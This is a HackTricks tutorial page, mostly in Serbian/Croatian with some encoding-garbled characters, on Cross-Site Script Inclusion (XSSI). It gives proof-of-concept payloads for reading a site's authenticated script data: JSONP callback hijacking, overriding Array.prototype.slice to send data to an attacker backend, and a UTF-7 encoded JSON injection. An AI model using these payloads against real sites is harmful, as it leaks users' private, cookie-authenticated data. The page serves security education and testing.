# XSSI (Cross-Site Script Inclusion)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Basic Information

**Cross-Site Script Inclusion (XSSI)** je ranjivost koja proisti캜e iz prirode `script` taga u HTML-u. Za razliku od ve캖ine resursa, koji podlije쬿 **Same-Origin Policy (SOP)**, skripte se mogu uklju캜ivati iz razli캜itih domena. Ovo pona코anje je zami코ljeno da olak코a kori코캖enje biblioteka i drugih resursa hostovanih na razli캜itim serverima, ali tako캠e uvodi potencijalni sigurnosni rizik.

### Key Characteristics of **XSSI**:
- **Zaobila쬰nje SOP**: Skripte su izuzete iz **Same-Origin Policy**, 코to im omogu캖ava da se uklju캜uju izme캠u domena.
- **Izlo쬰nost podataka**: Napada캜 mo쬰 iskoristiti ovo pona코anje da pro캜ita podatke u캜itane putem `script` taga.
- **Uticaj na dinami캜ki JavaScript/JSONP**: **XSSI** je posebno relevantan za dinami캜ki JavaScript ili **JSON with Padding (JSONP)**. Ove tehnologije 캜esto koriste informacije "ambient-authority" (kao 코to su kola캜i캖i) za autentifikaciju. Kada se zahteva skripta sa drugog hosta, ove akreditive (npr. kola캜i캖e) automatski uklju캜uju u zahtev.
- **Curjenje autentifikacionih tokena**: Ako napada캜 mo쬰 da prevari korisnikov pretra쬴va캜 da zatra쬴 skriptu sa servera koji kontroli코e, mo쬰 imati pristup osetljivim informacijama sadr쬬nim u tim zahtevima.

### Types

1. **Static JavaScript** - Ovo predstavlja konvencionalni oblik XSSI.
2. **Static JavaScript with Authentication** - Ova vrsta je posebna jer zahteva autentifikaciju za pristup.
3. **Dynamic JavaScript** - Uklju캜uje JavaScript koji dinami캜ki generi코e sadr쬬j.
4. **Non-JavaScript** - Odnosi se na ranjivosti koje ne uklju캜uju JavaScript direktno.

**The following information is a sumary of [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Check it for further details.


### Regular XSSI
U ovom pristupu, privatne informacije su ugra캠ene unutar globalno dostupne JavaScript datoteke. Napada캜i mogu identifikovati ove datoteke koriste캖i metode kao 코to su 캜itanje datoteka, pretrage klju캜nih re캜i ili regularne izraze. Kada se lociraju, skripta koja sadr쬴 privatne informacije mo쬰 se uklju캜iti u zlonamerni sadr쬬j, omogu캖avaju캖i neovla코캖en pristup osetljivim podacima. Primer tehnike eksploatacije je prikazan u nastavku:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI
Ove vrste XSSI napada uklju캜uju poverljive informacije koje se dinami캜ki dodaju u skriptu kao odgovor na korisnikov zahtev. Detekcija se mo쬰 izvr코iti slanjem zahteva sa i bez kola캜i캖a i upore캠ivanjem odgovora. Ako se informacije razlikuju, to mo쬰 ukazivati na prisustvo poverljivih informacija. Ovaj proces se mo쬰 automatizovati kori코캖enjem alata kao 코to je [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS) Burp ekstenzija.

Ako su poverljivi podaci pohranjeni u globalnoj promenljivoj, mogu se iskoristiti sli캜ne metode kao u Regular XSSI. Me캠utim, ako su poverljivi podaci uklju캜eni u JSONP odgovor, napada캜i mogu preuzeti funkciju povratnog poziva kako bi dobili informacije. To se mo쬰 uraditi ili manipulisanjem globalnim objektima ili postavljanjem funkcije koja 캖e biti izvr코ena od strane JSONP odgovora, kao 코to je prikazano u nastavku:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Za promenljive koje se ne nalaze u globalnom imenskom prostoru, *prototype tampering* se ponekad mo쬰 iskoristiti. Ova tehnika koristi dizajn JavaScript-a, gde interpretacija koda uklju캜uje prolazak kroz prototip lanac da bi se locirala pozvana svojstva. Predefinisanjem odre캠enih funkcija, kao 코to je `Array`-ova `slice`, napada캜i mogu pristupiti i otkriti ne-globalne promenljive:
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
Dalje informacije o napadnim vektorima mogu se na캖i u radu istra쬴va캜a bezbednosti [Sebastian Lekies](https://twitter.com/slekies), koji odr쬬va listu [vektora](http://sebastian-lekies.de/leak/).

### Non-Script-XSSI
Istra쬴vanje Takeshija Terade uvodi jo코 jedan oblik XSSI, gde se Non-Script datoteke, kao 코to su CSV, otkrivaju preko razli캜itih domena tako 코to se uklju캜uju kao izvori u `script` tag. Istorijski primeri XSSI, kao 코to su napad Jeremiah Grossmana iz 2006. godine za 캜itanje kompletnog Google adresara i curenje JSON podataka Joea Walkera iz 2007. godine, isti캜u ozbiljnost ovih pretnji. Pored toga, Gareth Heyes opisuje varijantu napada koja uklju캜uje UTF-7 kodirani JSON kako bi se izbegao JSON format i izvr코ili skripti, 코to je efikasno u odre캠enim pregleda캜ima:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
